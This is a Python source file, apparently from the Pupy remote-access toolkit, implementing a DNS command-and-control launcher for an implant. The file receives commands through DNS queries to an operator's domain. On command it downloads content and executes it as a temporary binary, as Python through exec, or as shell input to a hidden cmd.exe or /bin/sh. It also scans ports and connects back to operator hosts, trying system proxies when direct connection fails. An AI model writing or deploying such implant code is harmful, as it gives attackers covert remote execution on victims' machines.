# -*- coding: utf-8 -*-
# Copyright (c) 2016, Oleksii Shevchuk (alxchk@gmail.com)

__all__ = ['DNSCommandClientLauncher']

from ..base_launcher import BaseLauncher, LauncherArgumentParser, LauncherError
from ..picocmd.client import DnsCommandsClient
from ..picocmd.picocmd import ConnectablePort, OnlineStatus, PortQuizPort

from ..proxies import get_proxies, find_default_proxy

from ..socks import GeneralProxyError, ProxyConnectionError, HTTPError

from ..clients import PupyTCPClient, PupySSLClient
from ..clients import PupyProxifiedTCPClient, PupyProxifiedSSLClient

from ..online import PortQuiz, check
from ..scan import scan

from threading import Thread, Lock

from time import sleep

import socket
import os

import subprocess

import tempfile
import platform

from network.lib import getLogger

logger = getLogger('dnscnc')

def find_proxies(additional_proxies=None):
    proxy_info = find_default_proxy()
    if proxy_info:
        yield proxy_info

    for proxy_info in get_proxies(additional_proxies=additional_proxies):
        if proxy_info:
            yield proxy_info

class DNSCommandClientLauncher(DnsCommandsClient):
    def __init__(self, domain, ns=None, qtype='A', ns_timeout=3):
        self.stream = None
        self.commands = []
        self.lock = Lock()

        try:
            import pupy_credentials
            key = pupy_credentials.DNSCNC_PUB_KEY_V2
        except ImportError:
            from pupylib.PupyCredentials import Credentials
            credentials = Credentials()
            key = credentials['DNSCNC_PUB_KEY_V2']

        DnsCommandsClient.__init__(self, domain, key, ns, qtype, ns_timeout=ns_timeout)

    def on_session_established(self):
        import pupy
        if hasattr(pupy, 'infos'):
            pupy.infos['spi'] = '{:08x}'.format(self.spi)

    def on_session_lost(self):
        import pupy

        if hasattr(pupy, 'infos') and 'spi' in pupy.infos:
            del pupy.infos['spi']

    def on_downloadexec_content(self, url, action, content):
        self.on_pastelink_content(url, action, content)

    def on_pastelink_content(self, url, action, content):
        if action.startswith('exec'):
            tmp_path = None

            try:
                fd, tmp_path = tempfile.mkstemp()
                tmp = os.fdopen(fd, 'wb')
                tmp.write(content)
                tmp.close()

                if not platform.system == 'Windows':
                    os.chmod(tmp_path, 0700)

                os.system(tmp_path)

            except Exception as e:
                logger.exception(e)

            finally:
                if tmp_path:
                    os.unlink(tmp_path)

        elif action.startswith('pyexec'):
            try:
                exec content
            except Exception as e:
                logger.exception(e)
        elif action.startswith('sh'):
            try:
                pipe = None
                if platform.system == 'Windows':
                    kwargs = {
                        'stdin': subprocess.PIPE
                    }

                    if hasattr(subprocess, 'STARTUPINFO'):
                        startupinfo = subprocess.STARTUPINFO()
                        startupinfo.dwFlags |= \
                          subprocess.CREATE_NEW_CONSOLE | \
                          subprocess.STARTF_USESHOWWINDOW

                        kwargs.update({
                            'startupinfo': startupinfo,
                        })

                    pipe = subprocess.Popen('cmd.exe', **kwargs)
                else:
                    pipe = subprocess.Popen(['/bin/sh'], stdin=subprocess.PIPE)

                pipe.stdin.write(content)
                pipe.stdin.close()
                pipe.communicate()

            except Exception as e:
                logger.exception(e)

    def _checkconnect_worker(self, host, port_start, port_end):
        ports = xrange(port_start, port_end+1)
        connectable = scan([str(host)], ports)
        while connectable:
            chunk = [x[1] for x in connectable[:5]]
            connectable = connectable[5:]
            self.event(ConnectablePort(host, chunk))

    def on_checkconnect(self, host, port_start, port_end):
        worker = Thread(target=self._checkconnect_worker, args=(
            host, port_start, port_end))
        worker.daemon = True
        worker.start()

    def _checkonline_worker(self):
        logger.debug('CheckOnline worker started')
        portquiz = PortQuiz()
        portquiz.start()

        try:
            offset, mintime, register = check()
            logger.debug('OnlineStatus completed: %04x %04x %08x',
                offset, mintime, register)
            self.event(OnlineStatus(offset, mintime, register))
        except Exception, e:
            logger.exception('Online status check failed: %s', e)

        logger.debug('Wait for PortQuiz completion')
        portquiz.join()
        logger.debug('PortQuiz completed')

        try:
            if portquiz.available:
                self.event(PortQuizPort(portquiz.available[:8]))
        except Exception, e:
            logger.exception(e)

        logger.debug('CheckOnline worker completed')

    def on_checkonline(self):
        worker = Thread(target=self._checkonline_worker)
        worker.daemon = True
        worker.start()

    def on_connect(self, ip, port, transport, proxy):
        logger.debug('connect request: %s:%s %s %s', ip, port, transport, proxy)
        with self.lock:
            if self.stream and not self.stream.closed:
                logger.debug('ignoring connection request. stream = %s', self.stream)
                return

            self.commands.append(('connect', ip, port, transport, proxy))

    def on_disconnect(self):
        logger.debug('disconnect request [stream=%s]', self.stream)
        with self.lock:
            if self.stream:
                self.stream.close()
                self.stream = None

    def on_exit(self):
        with self.lock:
            if self.stream:
                self.stream.close()

        os._exit(0)

class DNSCncLauncher(BaseLauncher):
    ''' Micro command protocol built over DNS infrastructure '''

    credentials = ['DNSCNC_PUB_KEY_V2']

    def __init__(self, *args, **kwargs):
        self.connect_on_bind_payload = kwargs.pop('connect_on_bind_payload', False)
        super(DNSCncLauncher, self).__init__(*args, **kwargs)
        self.dnscnc = None
        self.exited = False

    def parse_args(self, args):
        self.args = self.arg_parser.parse_args(args)
        self.set_host(self.args.domain)
        self.set_transport(None)

        self.ns = self.args.ns
        self.ns_timeout = self.args.ns_timeout
        self.qtype = self.args.qtype

    def activate(self):
        if self.args is None:
            raise LauncherError('parse_args needs to be called before iterate')

        logger.info('Activating CNC protocol. Domain: %s', self.host)

        self.pupy = __import__('pupy')
        self.dnscnc = DNSCommandClientLauncher(
            self.host, self.ns, self.qtype, self.ns_timeout)
        self.dnscnc.daemon = True
        self.dnscnc.start()

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = LauncherArgumentParser(
            prog='dnscnc', description=cls.__doc__
        )

        cls.arg_parser.add_argument(
            '--domain',
            metavar='<domain>',
            required=True,
            help='controlled domain (hostname only, no IP, '
               'you should properly setup NS first. Port is NOT supported)'
        )

        cls.arg_parser.add_argument(
            '--ns', help='DNS server (will use internal DNS library)'
        )

        cls.arg_parser.add_argument(
            '--ns-timeout', help='DNS query timeout (only when internal DNS library used)',
            default=3, type=int,
        )

        cls.arg_parser.add_argument(
            '--qtype',
            choices=['A'], default='A',
            help='DNS query type (For now only A supported)'
        )

    def try_direct_connect(self, command):
        _, host, port, transport, _ = command
        t = self.transports[transport](
            bind_payload=self.connect_on_bind_payload
        )

        transport_args = {
            k:v for k,v in t.client_transport_kwargs.iteritems()
        }

        transport_args['host'] = '{}{}'.format(
            host, ':{}'.format(port) if port != 80 else ''
        )

        client = t.client()
        s = None
        stream = None

        try:
            s = client.connect(host, port)
            stream = t.stream(s, t.client_transport, transport_args)
        except socket.error as e:
            logger.error('Couldn\'t connect to %s:%s transport: %s: %s',
                host, port, transport, e)

        except Exception, e:
            logger.exception(e)

        return stream

    def try_connect_via_proxy(self, command):
        _, host, port, transport, connection_proxy = command
        if connection_proxy is True:
            connection_proxy = None

        for proxy_type, proxy, proxy_username, proxy_password in find_proxies(
               additional_proxies=[connection_proxy] if connection_proxy else None
        ):
            t = self.transports[transport](
                bind_payload=self.connect_on_bind_payload
            )

            transport_args = {
                k:v for k,v in t.client_transport_kwargs.iteritems()
            }

            transport_args['host'] = '{}{}'.format(
                host, ':{}'.format(port) if port != 80 else ''
            )

            if proxy_type.upper() not in t.internal_proxy_impl:
                if t.client is PupyTCPClient:
                    t.client = PupyProxifiedTCPClient
                elif t.client is PupySSLClient:
                    t.client = PupyProxifiedSSLClient
                else:
                    return

            s = None
            stream = None

            proxy_addr, proxy_port = proxy.rsplit(':', 1)
            proxy_port = int(proxy_port)

            transport_args['proxy'] = True

            if proxy_password or proxy_username:
                transport_args['auth'] = (proxy_username, proxy_password)

            transport_args['connect'] = host, port

            try:
                if proxy_type.upper() not in t.internal_proxy_impl:
                    client = t.client(
                        proxy_type=proxy_type.upper(),
                        proxy_addr=proxy_addr,
                        proxy_port=proxy_port,
                        proxy_username=proxy_username,
                        proxy_password=proxy_password
                    )
                else:
                    client = t.client()
                    host = proxy_addr
                    port = proxy_port

                s = client.connect(host, port)
                stream = t.stream(s, t.client_transport, transport_args)

            except (socket.error, GeneralProxyError, ProxyConnectionError, HTTPError) as e:
                if proxy_username and proxy_password:
                    proxy_auth = '{}:{}@'.format(proxy_username, proxy_password)
                else:
                    proxy_auth = ''

                logger.error('Couldn\'t connect to {}:{} transport: {} '
                                  'via {}://{}{}: {}'.format(
                    host, port, transport,
                    proxy_type, proxy_auth, proxy,
                    e
                ))

            except Exception, e:
                logger.exception(e)

            yield stream

    def iterate(self):
        import sys

        if not self.dnscnc:
            self.activate()

        while not self.exited and not sys.terminated:
            try:
                connection = self.process()
                if not connection:
                    continue

                stream, transport = connection
                if not stream:
                    continue

                logger.debug('stream created, yielding - %s', stream)

                self.dnscnc.stream = stream
                self.pupy.infos['transport'] = transport

                yield stream

                with self.dnscnc.lock:
                    logger.debug('stream completed - %s', stream)

                    self.dnscnc.stream = None
                    self.pupy.infos['transport'] = None

            except Exception, e:
                logger.exception(e)

    def process(self):
        command = None
        connection = None
        wait = False

        with self.dnscnc.lock:
            if self.dnscnc.commands:
                command = self.dnscnc.commands.pop()

            if not command:
                wait = True

            elif command[0] == 'connect':
                try:
                    connection = self.on_connect(command)
                except socket.error:
                    pass

                if not connection:
                    self.event(0x20000000 | 0xFFFE)

        if wait:
            sleep(5)

        return connection

    def on_connect(self, command):
        logger.debug('processing connection command')

        stream = None
        transport = None

        logger.debug('connection proxy: %s', command[4])
        if command[4]:
            logger.debug('omit direct connect')
            stream = None
        else:
            logger.debug('try direct connect')
            stream = self.try_direct_connect(command)

        if not stream and command[4] is not False:
            logger.debug('try connect via proxy')
            for stream in self.try_connect_via_proxy(command):
                if stream:
                    break

        if stream:
            transport = command[3]
        else:
            logger.debug('all connection attempt has been failed')

        return stream, transport
